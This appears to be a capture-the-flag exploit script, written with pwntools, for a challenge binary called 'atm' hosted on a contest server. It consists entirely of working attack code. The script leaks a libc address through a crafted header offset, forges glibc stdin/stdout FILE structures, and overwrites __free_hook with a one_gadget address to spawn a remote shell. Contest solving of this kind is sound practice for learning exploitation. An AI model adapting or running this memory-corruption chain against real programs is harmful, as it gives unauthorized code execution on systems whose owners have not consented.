from pwn import *

e = ELF("./atm")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("atm.nc.jctf.pro", 1337)
else:
  p = process(e.path)
  # p = remote("localhost", 3001)

def alloc(size, idx=0):
  p.sendline("1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", ("ATM-REQ/1.0\natm-ip: smth-here\n" + ("mask-pin-at: " + str(idx) + "\n" if idx != 0 else "")).ljust(size, " "))

  p.recvuntil("(3)")

def clean():
  p.sendline("2")

  p.recvuntil("(3)")

p.recvuntil("(3)")

gdb.attach(p)
alloc(0x20000, 0x7f45ee706a31 - 0x7f45eeead010)
alloc(0x20000)

p.sendline("3")
p.recvuntil("PIN: ")
leak = 0x7f * 0x100 ** 5 + int(p.recvline(), 16) * 0x100 + 0x00007f928ca40000 - 0x7f928d1c9a00 + 0x00007f17188b5000 - 0x00007f1718517000

p.recvuntil("(3)")

print("{:#x}".format(leak))

hook = leak + libc.symbols["_IO_2_1_stdin_"]

if (hook // 0x1000000) % 0x100 >= 0x2a:
  print("Invalid libc address")
  exit()

alloc(0x20000, 0x7f31bc1a9a40 - 0x7f31bc90e010)
ui.yesno("S")

std21 = libc.symbols["stdout"] - 0x100 + 0x18
print("{:#x}".format(std21))

p.send(
  "2 ".ljust(std21 - libc.symbols["_IO_2_1_stdin_"] - 0x83 - 0xe0, "\x00")
  + (
    p64(0xfbad2086)
    + p64(0) * 16
    + p64(leak + 0x00007ffff78308b0 - 0x00007ffff7443000)
    + "\xff" * 8
    + p64(0) * 8 
    + p64(leak +  0x00007ffff782b2a0 - 0x00007ffff7443000)
  ).ljust(0xe0, "\x00")
  + (
    p64(0xfbad2887)
    + p64(leak + std21 + 131) * 7
    + p64(leak + std21 + 131 + 1)
    + p64(0) * 8 
    + p64(leak + 0x7ffff78308c0 - 0x00007ffff7443000)
    + "\xff" * 8
    + p64(0) * 8 
    + p64(leak +  0x00007ffff782b2a0 - 0x00007ffff7443000)
  ).ljust(libc.symbols["stdout"] - std21, "\x00")
  + p64(leak + std21).ljust(libc.symbols["__free_hook"] - libc.symbols["stdout"], "\x00")
  + p64(leak + 0x4f322)
)



p.interactive()
